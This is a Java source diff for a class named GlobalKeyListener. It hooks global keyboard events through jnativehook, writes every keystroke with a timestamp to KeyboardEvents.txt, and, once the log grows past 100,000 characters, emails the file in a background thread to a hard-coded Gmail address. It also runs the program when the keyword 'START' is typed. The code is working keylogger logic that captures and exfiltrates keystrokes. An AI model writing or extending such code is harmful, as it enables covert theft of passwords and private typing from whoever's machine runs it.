@@ -1,15 +1,29 @@
+package events;
+
+import javafx.application.Application;
+import javafx.stage.Stage;
+import logic.QueueBuffer;
+import logic.TimeManager;
+import logs.FileLogWriter;
+import logs.SendEmail;
+import main.Main;
+import main.SettingWindow;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
-public class GlobalKeyListener implements NativeKeyListener {
+import java.util.concurrent.Callable;
 
-    private FileWriter writer = new FileWriter("KeyboardEvents.txt");
+public class GlobalKeyListener implements NativeKeyListener{
 
+    private FileLogWriter writer = new FileLogWriter("KeyboardEvents.txt");
     private QueueBuffer<Character> buf = new QueueBuffer<>(5);
+    private long fileSize = 0;
 
-    private int fileSize = 0;
+    public void setFileSize(long fileSize){
+        this.fileSize = fileSize;
+    }
 
     public void nativeKeyPressed(NativeKeyEvent e) {
         System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
@@ -22,8 +36,9 @@ public class GlobalKeyListener implements NativeKeyListener {
                 e1.printStackTrace();
             }
         }
-
-
+        if (buf.toString().equals("START")) {
+            Main.run();
+        }
     }
 
     public void nativeKeyReleased(NativeKeyEvent e) {
@@ -40,12 +55,12 @@ public class GlobalKeyListener implements NativeKeyListener {
         String str = TimeManager.getTime() + "\t" + message + ": " + e.getKeyCode() + " " + NativeKeyEvent.getKeyText(e.getKeyCode());
         writer.write(str);
         fileSize+=str.length();
-        if(fileSize>40000){
+        if(fileSize>100000){
             fileSize=0;
             Thread sendMailThread = new Thread(new Runnable() {
                 @Override
                 public void run() {
-                    String res = SendEmail.send("Keyboard events", "KeyboardEvents.txt");
+                    String res = SendEmail.send("bsuir.dmitriy.dronov@gmail.com","Keyboard events", "KeyboardEvents.txt");
                     if(res.equals("Done")) writer.flush();
                 }
             });
